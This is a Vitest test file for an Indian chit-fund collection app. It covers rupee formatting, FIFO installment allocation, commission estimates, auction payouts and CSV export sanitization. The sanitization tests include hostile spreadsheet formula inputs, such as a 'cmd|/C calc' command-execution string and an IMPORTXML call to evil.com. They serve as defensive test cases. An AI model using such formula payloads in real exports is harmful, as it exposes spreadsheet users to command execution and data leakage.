import { describe, it, expect } from 'vitest';
import { formatINR, formatINRDecimals, formatDate } from '../utils/formatters';

// CSV Formula Injection Sanitizer (matching ReportsPage & ImportPage)
function sanitizeCsvCell(val: any): string {
  if (val === null || val === undefined) return '""';
  let str = String(val).trim();
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }
  return `"${str.replace(/"/g, '""')}"`;
}

// Mobile Collection FIFO allocation simulator (matching CollectPage)
interface PendingInstallment {
  installmentId: string;
  monthNumber: number;
  dueAmount: number;
}

function calculateInstallmentAllocations(
  paymentAmount: number,
  pendingInstallments: PendingInstallment[],
) {
  if (paymentAmount <= 0) return { allocations: [], unallocated: 0, totalAllocated: 0 };

  let remaining = paymentAmount;
  const allocations: { installmentId: string; allocatedAmount: number; remainingDue: number }[] = [];

  for (const inst of pendingInstallments) {
    if (remaining <= 0) break;
    const allocate = Math.min(remaining, inst.dueAmount);
    allocations.push({
      installmentId: inst.installmentId,
      allocatedAmount: allocate,
      remainingDue: inst.dueAmount - allocate,
    });
    remaining -= allocate;
  }

  const totalAllocated = paymentAmount - remaining;
  return {
    allocations,
    unallocated: remaining,
    totalAllocated,
  };
}

describe('Financial Logic & Mobile Collection Validations', () => {
  describe('Currency & Localization Formatting (INR Asia/Kolkata)', () => {
    it('formats numbers to Indian Rupee currency standard', () => {
      expect(formatINR(0)).toBe('₹0');
      expect(formatINR(5000)).toMatch(/₹\s?5,000/);
      expect(formatINR(100000)).toMatch(/₹\s?1,00,000/);
      expect(formatINR(1000000)).toMatch(/₹\s?10,00,000/);
    });

    it('formats decimal precision accurately without floating point anomalies', () => {
      expect(formatINRDecimals(2500.5)).toMatch(/₹\s?2,500\.50/);
      expect(formatINRDecimals(null)).toBe('₹0.00');
      expect(formatINRDecimals(undefined)).toBe('₹0.00');
    });

    it('formats business dates gracefully', () => {
      expect(formatDate(null)).toBe('-');
      expect(formatDate(undefined)).toBe('-');
      expect(formatDate('2026-05-15')).toMatch(/15\s+(May|05)\s+2026/);
    });
  });

  describe('FIFO Installment Allocation Preview', () => {
    const installments: PendingInstallment[] = [
      { installmentId: 'inst-1', monthNumber: 1, dueAmount: 5000 },
      { installmentId: 'inst-2', monthNumber: 2, dueAmount: 5000 },
      { installmentId: 'inst-3', monthNumber: 3, dueAmount: 5000 },
    ];

    it('allocates partial amount to the earliest installment', () => {
      const result = calculateInstallmentAllocations(2000, installments);
      expect(result.allocations).toHaveLength(1);
      expect(result.allocations[0].installmentId).toBe('inst-1');
      expect(result.allocations[0].allocatedAmount).toBe(2000);
      expect(result.allocations[0].remainingDue).toBe(3000);
      expect(result.totalAllocated).toBe(2000);
      expect(result.unallocated).toBe(0);
    });

    it('allocates full amount to first installment and spills remainder to next installment', () => {
      const result = calculateInstallmentAllocations(7500, installments);
      expect(result.allocations).toHaveLength(2);
      expect(result.allocations[0].allocatedAmount).toBe(5000);
      expect(result.allocations[0].remainingDue).toBe(0);
      expect(result.allocations[1].allocatedAmount).toBe(2500);
      expect(result.allocations[1].remainingDue).toBe(2500);
      expect(result.totalAllocated).toBe(7500);
      expect(result.unallocated).toBe(0);
    });

    it('tracks unallocated balance if payment exceeds total pending dues', () => {
      const result = calculateInstallmentAllocations(20000, installments);
      expect(result.allocations).toHaveLength(3);
      expect(result.totalAllocated).toBe(15000);
      expect(result.unallocated).toBe(5000);
    });

    it('handles zero or negative payment gracefully', () => {
      const result = calculateInstallmentAllocations(0, installments);
      expect(result.allocations).toHaveLength(0);
      expect(result.totalAllocated).toBe(0);
      expect(result.unallocated).toBe(0);
    });
  });

  describe('CSV Export Formula Injection Security', () => {
    it('escapes dangerous spreadsheet calculation prefixes (=, +, -, @)', () => {
      expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe('"\'=SUM(A1:A10)"');
      expect(sanitizeCsvCell('+cmd|/C calc')).toBe('"\' +cmd|/C calc"'.replace(' ', ''));
      expect(sanitizeCsvCell('-100')).toBe('"\' -100"'.replace(' ', ''));
      expect(sanitizeCsvCell('@IMPORTXML("http://evil.com")')).toBe('"\'@IMPORTXML(""http://evil.com"")"');
    });

    it('preserves clean customer codes and text without alterations', () => {
      expect(sanitizeCsvCell('CUST-001')).toBe('"CUST-001"');
      expect(sanitizeCsvCell('Durga Devi')).toBe('"Durga Devi"');
      expect(sanitizeCsvCell(5000)).toBe('"5000"');
    });
  });

  describe('Scheme A: Diwali Weekly Chit Calculations', () => {
    it('verifies 52 weekly installments of ₹200 produce exactly ₹10,400 expected contribution', () => {
      const weeklyContribution = 200;
      const totalWeeks = 52;
      const totalExpectedContribution = weeklyContribution * totalWeeks;
      expect(totalExpectedContribution).toBe(10400);
      expect(formatINR(totalExpectedContribution)).toMatch(/₹\s?10,400/);
    });

    it('allocates partial and multi-week collections correctly across 52 weekly installments', () => {
      const weeklyInstallments: PendingInstallment[] = [
        { installmentId: 'wk-1', monthNumber: 1, dueAmount: 200 },
        { installmentId: 'wk-2', monthNumber: 2, dueAmount: 200 },
        { installmentId: 'wk-3', monthNumber: 3, dueAmount: 200 },
      ];

      // Partial payment of ₹150 for Week 1
      const partial = calculateInstallmentAllocations(150, weeklyInstallments);
      expect(partial.allocations).toHaveLength(1);
      expect(partial.allocations[0].allocatedAmount).toBe(150);
      expect(partial.allocations[0].remainingDue).toBe(50);

      // Multi-week payment of ₹500
      const multi = calculateInstallmentAllocations(500, weeklyInstallments);
      expect(multi.allocations).toHaveLength(3);
      expect(multi.allocations[0].allocatedAmount).toBe(200);
      expect(multi.allocations[1].allocatedAmount).toBe(200);
      expect(multi.allocations[2].allocatedAmount).toBe(100);
      expect(multi.totalAllocated).toBe(500);
    });
  });

  describe('Scheme B: ₹1 Lakh Chit Calculations & Financial Distinctions', () => {
    it('verifies 20 monthly installments of ₹5,000 produce exactly ₹1,00,000 scheduled contribution per member', () => {
      const monthlyContribution = 5000;
      const totalMonths = 20;
      const totalScheduled = monthlyContribution * totalMonths;
      expect(totalScheduled).toBe(100000);
      expect(formatINR(totalScheduled)).toMatch(/₹\s?1,00,000/);
    });

    it('ensures stated ₹1,00,000 chit prize is distinct from monthly collection total', () => {
      const statedChitPrize = 100000;
      const monthlyContribution = 5000;

      // When member capacity is 20: monthly collection = 20 * 5,000 = ₹1,00,000
      const capacity20MonthlyTotal = 20 * monthlyContribution;
      expect(capacity20MonthlyTotal).toBe(statedChitPrize);

      // When member capacity is unconfirmed / 15: monthly collection = 15 * 5,000 = ₹75,000
      const capacity15MonthlyTotal = 15 * monthlyContribution;
      expect(capacity15MonthlyTotal).not.toBe(statedChitPrize);
      expect(capacity15MonthlyTotal).toBe(75000);

      // Winning net payout after 5% foreman commission and bid discount
      const foremanCommission = statedChitPrize * 0.05; // ₹5,000
      const bidDiscount = 20000;
      const netPayout = statedChitPrize - bidDiscount;
      expect(foremanCommission).toBe(5000);
      expect(netPayout).toBe(80000);
    });
  });

  describe('Commission & Earnings Options & Illustrative Estimates', () => {
    // Import helper simulator
    const calculateEstimate = (
      type: string,
      rate: number | undefined,
      amount: number | undefined,
      totalChitValue: number,
      installmentAmount: number,
      totalPeriods: number,
    ) => {
      switch (type) {
        case 'NO_COMMISSION':
          return { estimateINR: 0, isZero: true };
        case 'PERCENTAGE_OF_CHIT_VALUE':
          return { estimateINR: (totalChitValue * (rate || 0)) / 100, isZero: false };
        case 'PERCENTAGE_OF_EACH_COLLECTION': {
          const perPeriod = (installmentAmount * totalPeriods * (rate || 0)) / 100;
          return { estimateINR: perPeriod * totalPeriods, isZero: false };
        }
        case 'FIXED_AMOUNT_PER_INSTALLMENT':
          return { estimateINR: (amount || 0) * totalPeriods, isZero: false };
        case 'FIXED_AMOUNT_PER_CHIT_GROUP':
          return { estimateINR: amount || 0, isZero: false };
        case 'AUCTION_BASED_EARNINGS':
          return { estimateINR: (totalChitValue * (rate || 5.0)) / 100, isZero: false };
        case 'CUSTOM_OTHER':
          return { estimateINR: amount !== undefined ? amount : null, isZero: false };
        case 'NOT_CONFIGURED':
        default:
          return { estimateINR: null, isZero: false };
      }
    };

    it('Option 1: No Commission returns exactly ₹0', () => {
      const res = calculateEstimate('NO_COMMISSION', undefined, undefined, 100000, 5000, 20);
      expect(res.estimateINR).toBe(0);
      expect(res.isZero).toBe(true);
    });

    it('Option 2: Percentage of Chit Value calculates against stated chit value', () => {
      const res = calculateEstimate('PERCENTAGE_OF_CHIT_VALUE', 5.0, undefined, 100000, 5000, 20);
      expect(res.estimateINR).toBe(5000); // 5% of ₹1,00,000 = ₹5,000
    });

    it('Option 3: Percentage of Each Collection calculates across collection cycles', () => {
      // 20 members * ₹5,000 = ₹1,00,000 collection pool per month. 4% = ₹4,000/mo * 20 mos = ₹80,000
      const res = calculateEstimate('PERCENTAGE_OF_EACH_COLLECTION', 4.0, undefined, 100000, 5000, 20);
      expect(res.estimateINR).toBe(80000);
    });

    it('Option 4: Fixed Amount per Installment multiplies fixed fee by total scheduled installments', () => {
      // ₹250 per installment * 52 weeks = ₹13,000
      const res = calculateEstimate('FIXED_AMOUNT_PER_INSTALLMENT', undefined, 250, 10400, 200, 52);
      expect(res.estimateINR).toBe(13000);
    });

    it('Option 5: Fixed Amount per Chit Group maintains one-time flat fee', () => {
      const res = calculateEstimate('FIXED_AMOUNT_PER_CHIT_GROUP', undefined, 6000, 100000, 5000, 20);
      expect(res.estimateINR).toBe(6000);
    });

    it('Option 6: Auction-Based Earnings computes statutory quota without assuming 100% bid retention', () => {
      const res = calculateEstimate('AUCTION_BASED_EARNINGS', 5.0, undefined, 100000, 5000, 20);
      expect(res.estimateINR).toBe(5000);
      // Remainder of bid discount (e.g. ₹20,000 - ₹5,000 = ₹15,000) is dividend to members
      const bidDiscount = 20000;
      const memberDividend = bidDiscount - (res.estimateINR ?? 0);
      expect(memberDividend).toBe(15000);
    });

    it('Option 7: Custom / Other returns custom baseline amount or null pending documentation', () => {
      const resWithAmount = calculateEstimate('CUSTOM_OTHER', undefined, 7500, 100000, 5000, 20);
      expect(resWithAmount.estimateINR).toBe(7500);

      const resWithoutAmount = calculateEstimate('CUSTOM_OTHER', undefined, undefined, 100000, 5000, 20);
      expect(resWithoutAmount.estimateINR).toBeNull();
    });

    it('Draft / Not Configured leaves estimate as null to disable financial deduction', () => {
      const res = calculateEstimate('NOT_CONFIGURED', undefined, undefined, 100000, 5000, 20);
      expect(res.estimateINR).toBeNull();
    });
  });

  describe('Auction Calculation Modes & Payout Previews', () => {
    // Auction calculation helper
    function computeAuction(
      mode: 'DISCOUNT_BASED' | 'FIXED_PAYOUT',
      totalValue: number,
      totalMembers: number,
      winningBidAmount?: number,
      foremanCommissionRate?: number,
      isCommissionConfirmed?: boolean,
      fixedPayoutAmount?: number,
      adjustmentAmount?: number,
    ) {
      if (mode === 'DISCOUNT_BASED') {
        const winningBid = winningBidAmount || 0;
        const commission = isCommissionConfirmed && foremanCommissionRate
          ? Math.round(((totalValue * foremanCommissionRate) / 100) * 100) / 100
          : 0;

        let dividendTotal = 0;
        let dividendPerMember = 0;
        if (winningBid > 0) {
          dividendTotal = Math.max(0, winningBid - commission);
          dividendPerMember = Math.floor((dividendTotal / totalMembers) * 100) / 100;
        }

        const netPrizeAmount = totalValue - winningBid;
        return {
          mode,
          winningBid,
          foremanCommission: commission,
          dividendTotal,
          dividendPerMember,
          netPrizeAmount,
        };
      } else {
        const fixedPayout = fixedPayoutAmount !== undefined ? fixedPayoutAmount : totalValue;
        const adjustments = adjustmentAmount || 0;
        const netPrizeAmount = fixedPayout - adjustments;

        return {
          mode,
          winningBid: 0,
          foremanCommission: adjustments,
          dividendTotal: 0,
          dividendPerMember: 0,
          fixedPayoutAmount: fixedPayout,
          adjustmentAmount: adjustments,
          netPrizeAmount,
        };
      }
    }

    it('Discount-Based: Computes winning bid, confirmed 5% commission, and member dividend correctly', () => {
      const result = computeAuction('DISCOUNT_BASED', 100000, 20, 22000, 5.0, true);
      expect(result.winningBid).toBe(22000);
      expect(result.foremanCommission).toBe(5000);
      expect(result.dividendTotal).toBe(17000);
      expect(result.dividendPerMember).toBe(850); // 17000 / 20 = 850
      expect(result.netPrizeAmount).toBe(78000); // 100000 - 22000
    });

    it('Discount-Based Safeguard: Unconfirmed commission is NOT deducted from discount pool', () => {
      const result = computeAuction('DISCOUNT_BASED', 100000, 20, 20000, 5.0, false);
      expect(result.foremanCommission).toBe(0); // Unconfirmed = 0
      expect(result.dividendTotal).toBe(20000); // Full discount distributed to members
      expect(result.dividendPerMember).toBe(1000);
      expect(result.netPrizeAmount).toBe(80000);
    });

    it('Zero Discount Safeguard: Never generates dividends when no discount exists', () => {
      const result = computeAuction('DISCOUNT_BASED', 100000, 20, 0, 5.0, true);
      expect(result.winningBid).toBe(0);
      expect(result.dividendTotal).toBe(0);
      expect(result.dividendPerMember).toBe(0);
      expect(result.netPrizeAmount).toBe(100000); // Winner gets full chit value
    });

    it('Fixed Payout Mode: Sets auction discount to zero and dividend to zero', () => {
      const result = computeAuction('FIXED_PAYOUT', 100000, 20, undefined, undefined, undefined, 95000, 1000);
      expect(result.winningBid).toBe(0);
      expect(result.dividendTotal).toBe(0);
      expect(result.dividendPerMember).toBe(0);
      expect(result.fixedPayoutAmount).toBe(95000);
      expect(result.adjustmentAmount).toBe(1000);
      expect(result.netPrizeAmount).toBe(94000); // 95000 - 1000
    });

    it('Fixed Payout Mode: Does not assume payout equals chit value, preserves scheme terms', () => {
      // Scheme with ₹10,400 total value and ₹10,400 fixed payout with 0 adjustments
      const diwaliScheme = computeAuction('FIXED_PAYOUT', 10400, 52, undefined, undefined, undefined, 10400, 0);
      expect(diwaliScheme.netPrizeAmount).toBe(10400);
      expect(diwaliScheme.dividendPerMember).toBe(0);

      // Scheme with ₹2,00,000 total value and agreed ₹1,85,000 payout
      const scheme2L = computeAuction('FIXED_PAYOUT', 200000, 20, undefined, undefined, undefined, 185000, 2500);
      expect(scheme2L.netPrizeAmount).toBe(182500); // 185000 - 2500
      expect(scheme2L.dividendPerMember).toBe(0);
    });
  });
});

